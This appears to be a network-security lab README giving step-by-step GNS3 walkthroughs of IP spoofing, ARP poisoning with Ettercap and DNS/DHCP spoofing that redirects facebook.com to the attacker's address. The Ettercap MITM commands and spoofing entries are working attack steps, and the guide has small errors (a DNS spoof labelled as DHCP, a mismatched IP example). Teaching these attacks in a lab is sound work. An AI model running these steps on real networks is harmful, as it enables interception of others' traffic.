# IP SPOOFING

**IP spoofing** is the creation of *Internet Protocol (IP)* packets which have a modified source address in order to either hide the identity of the sender, to impersonate another computer system, or both. It is a technique often used by bad actors to invoke **DDoS attacks** against a target device or the surrounding infrastructure.

Sending and receiving IP packets is a primary way in which networked computers and other devices communicate, and constitutes the basis of the modern internet. All IP packets contain a header which precedes the body of the packet and contains important routing information, including the source address. In a normal packet, the source IP address is the address of the sender of the packet. If the packet has been spoofed, the source address will be forged.

## IP Spoofing example
### Settings:
 * **Attacker:** debian machine
 * **Victim:** ubuntu-1 host machine
 * **Router:** cisco-7200 image (R1 machine)
 * **Switch:** cisco-3745 image (SW1 machine)
 * **Other actors:** ubuntu-2 host machine

### Steps:
* Run the GNS3 lab
* Connect to **R1** and check the current IP/MAC assignment using the followng command

        show ip arp        
* Connect to the **attacker machine**
* Execute `nmap` command in order to scan all the network 

        sudo nmap -sPn 10.0.0.0/24
* Choose the IP and MAC address of the machine you want to attack (we will choose the ip addres of the **ubuntu-1 host** for simplicity)
* Execute the `ip_spoofer.py` script as superuser

        sudo python3 ip_spoofer.py <Victim_MAC_ADDRESS> <Victim_IP_ADDRESS>
* Connect again to **R1** and check the current IP/MAC assignment using the followng command

        show ip arp
* The pair `<ip,mac>` related to the ip address of our **Victim** has been changed
* Connect to another **ubuntu host machine** (ubuntu-2, for example) and run the following command

        ping <Victim_IP_ADDRESS>
* Execute **Wireshark** on the link which connects the **Victim** machine to the **Switch (SW1)**
    * Check if the **Victim** is receiving new **icmp** requests
* Execute **Wireshark** on the link which connects the **Attacker** machine to the **Switch (SW1)**
    * Check if the **Attacker** is receiving new **icmp** requests


# ARP Poisoning Attack using Ettercap

An **ARP spoofing**, also known as **ARP poisoning**, is a Man in the Middle _**(MitM)**_ attack that allows attackers to intercept communication between network devices.

## ARP Poisoning example with Ettercap
### Settings:
 * **Attacker:** debian machine
 * **Victim:** ubuntu-1 host machine
 * **Router:** cisco-7200 image (R1 machine)
 * **Switch:** cisco-3745 image (SW1 machine)
 * **Other actors:** ubuntu-2 host machine

### Steps:
* Run the GNS3 lab
* Connect to **R1** and check the current IP/MAC assignment using the followng command

        show ip arp        
* Connect to the **attacker machine**
* Install **ettercap**

        sudo apt update
        sudo apt install ettercap-text-only
* Edit the file `/etc/ettercap/etter.conf`

        sudo pico /etc/ettercap/etter.conf
* Uncomment the following line by removing the `#` at the beginning of the string

  * Before:

        #redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
  * After:

        redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
* Execute `ettercap` command in order to scan all the network 
  * `-T:` **select the text only GUI**

        sudo ettercap -T
  * Press `spacebar` to enable/disable packets view
  * Press `l` (lowercase `L`) to show information about discovered devices in the network
* Choose the IP and MAC address of the machine you want to attack (we will choose the ip addres of the **ubuntu-1 host** for simplicity)
* Stop `ettercap` pressing `q` 
* Run (again) `ettercap` in order to start with the **MITM** attack based on ARP Poisoning
  * `-M:` perform a mitm attack. Requires an additional argument useful to specify the **attack type**
  * `<ATTACK_TYPE>:` **ARP**, DHCP, ICMP, etc (see `man ettercap`) 
  * `<VICTIM_TARGET>:` is in the form `MAC/IPs/IPv6/PORTs`. If you want you can omit any of its parts and this will represent an ANY in that part, e.g.,
    
    `/10.0.0.5//` means **ANY mac address**, **ONLY ip 10.0.0.1**, **ANY IPv6** and **ANY port**

        sudo ettercap -T -M <ATTACK_TYPE> <VICTIM_TARGET>

* Connect again to **R1** and check the current IP/MAC assignment using the followng command

        show ip arp
* The pair `<ip,mac>` related to the ip address of our **Victim** has been changed
* Connect to another **ubuntu host machine** (ubuntu-2, for example) and run the following command

        ping <Victim_IP_ADDRESS>
* Execute **Wireshark** on the link which connects the **Victim** machine to the **Switch (SW1)**
    * Check if the **Victim** is receiving new **icmp** requests
* Execute **Wireshark** on the link which connects the **Attacker** machine to the **Switch (SW1)**
    * Check if the **Attacker** is receiving new **icmp** requests

# DHCP SPOOFING

**DHCP Spoofing** occurs when an attacker attempts to respond to DHCP requests and trying to list itself (spoof) as the default gateway or DNS server, hence, initiating a man in the middle attack. With that, it is possible that they can intercept traffic from users before forwarding to the real gateway or perform **DoS** by flooding the real DHCP server with requests to choke IP address resources.

## DHCP Spoofing example with **Ettercap**

### Settings:
 * **Attacker:** debian machine
 * **Victim:** ubuntu-1 host machine
 * **Router:** cisco-7200 image (R1 machine)
 * **Switch:** cisco-3745 image (SW1 machine)
 * **Other actors:** ubuntu-2 host machine

### Steps:
* Run the GNS3 lab
* Connect to the **attacker machine**
* Install **ettercap**

        sudo apt update
        sudo apt install ettercap-text-only
* Edit the file `/etc/ettercap/etter.dns`

        sudo pico /etc/ettercap/etter.dns
* Add lines in order to declare yourself as dhcp server

        <Website> <DNS_Query_Type> <Attacker_IP_Address>
* E.g., add the following lines at the end of the file

        facebook.com        A       10.0.0.2
        *.facebook.com      A       10.0.0.2
        www.facebook.com    PTR     10.0.0.2
* Note that, in our example we setup the following parameters
  * `Website:` is **facebook.com** OR ***.facebook.com** OR **www.facebook.com**
  * `DNS_Query_Type`: is **A** OR **PTR**
    * `A:` is the Address Mapping record **(A Record)** - also known as a **DNS host record**. It stores a hostname and its corresponding IPv4 address
    * `PTR:` is a DNS **P**oin**T**er **R**ecord (PTR). It provides the domain name associated with an IP address. A DNS PTR record is exactly the opposite of the **A** record, which provides the IP address associated with a domain name. **DNS PTR records are used in reverse DNS lookups** 
  * `Attacker_IP_Address:` is **10.0.0.2**
* Execute `ettercap` command in order to scan all the network 
  * `-T:` **select the text only GUI**

        sudo ettercap -T
  * Press `spacebar` to enable/disable packets view
  * Press `l` (lowercase `L`) to show information about discovered devices in the network
* Choose the IP and MAC address of the machine you want to attack (we will choose the ip addres of the **ubuntu-1 host** for simplicity)
* Stop `ettercap` pressing `q` 
* Run (again) `ettercap` in order to start with the **MITM** attack based on ARP
  * `-M:` perform a mitm attack. Requires an additional argument useful to specify the **attack type**
  * `<ATTACK_TYPE>:` **ARP**, DHCP, ICMP, etc (see `man ettercap`) 
  * `<VICTIM_TARGET>:` is in the form `MAC/IPs/IPv6/PORTs`. If you want you can omit any of its parts and this will represent an ANY in that part, e.g.,
    
    `/10.0.0.5//` means **ANY mac address**, **ONLY ip 10.0.0.1**, **ANY IPv6** and **ANY port**

        sudo ettercap -T -M <ATTACK_TYPE> <VICTIM_TARGET>

* Connect to the **Victim machine**  and run the following command

        ping facebook.com
* Execute **Wireshark** on the link which connects the **Victim** machine to the **Switch (SW1)**
    * Check if the **Victim** is receiving new **icmp** requests
* Execute **Wireshark** on the link which connects the **Attacker** machine to the **Switch (SW1)**
    * Check if the **Attacker** is receiving new **icmp** requests
  